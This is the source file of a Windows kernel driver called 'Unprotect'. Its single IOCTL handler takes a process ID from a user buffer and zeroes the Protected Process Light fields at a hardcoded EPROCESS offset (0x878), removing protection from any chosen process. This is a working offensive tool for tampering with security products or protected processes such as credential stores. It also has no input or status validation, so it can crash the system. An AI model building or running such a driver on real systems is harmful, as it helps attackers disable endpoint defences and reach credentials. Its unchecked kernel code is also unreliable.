//#include <ntddk.h>
#include <ntifs.h>
#include "ioctl.h"
#include "Common.h"

// Protection offset : 0x878

#pragma warning(disable: 4996)

void DriverCleanup(PDRIVER_OBJECT DriverObject);
NTSTATUS CreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);

NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);


UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\Unprotect");
UNICODE_STRING symlink = RTL_CONSTANT_STRING(L"\\??\\Unprotect");


extern "C"
NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);


    DriverObject->DriverUnload = DriverCleanup;
    DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;

    PDEVICE_OBJECT deviceObject;
    NTSTATUS status = IoCreateDevice(
        DriverObject,
        0,
        &deviceName,
        FILE_DEVICE_UNKNOWN,
        0,
        FALSE,
        &deviceObject
    );

    if (!NT_SUCCESS(status))
    {
        DbgPrint("[!] Failed to create Device Object (0x%08X)\n", status);
        return status;
    }

    status = IoCreateSymbolicLink(&symlink, &deviceName);

    if (!NT_SUCCESS(status))
    {
        DbgPrint("[!] Failed to create symlink (0x%08X)\n", status);
        IoDeleteDevice(deviceObject);
        return status;
    }

    return STATUS_SUCCESS;
}

void
DriverCleanup(
    PDRIVER_OBJECT DriverObject)
{

    IoDeleteSymbolicLink(&symlink);
    IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS
CreateClose(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);


    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;

    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}


NTSTATUS DeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);

    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG_PTR length = 0;

    switch (stack->Parameters.DeviceIoControl.IoControlCode)
    {
    case UNPROTECT_IOCTL_TEST: {
        DbgPrint("[+] UNPROTECT_IOCTL_TEST called\n");

        TargetProcess* target = (TargetProcess*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

        PEPROCESS eProcess = NULL;
        status = PsLookupProcessByProcessId((HANDLE)target->ProcessId, &eProcess);

        PROCESS_PROTECTION_INFO* psProtection = (PROCESS_PROTECTION_INFO*)(((ULONG_PTR)eProcess) + 0x878);


        psProtection->SignatureLevel = 0;
        psProtection->SectionSignatureLevel = 0;
        psProtection->Protection.Type = 0;
        psProtection->Protection.Signer = 0;

        ObDereferenceObject(eProcess);

        break;
    }
    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        DbgPrint("[!] STATUS_INVALID_DEVICE_REQUEST\n");
        break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = length;

    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return status;
}
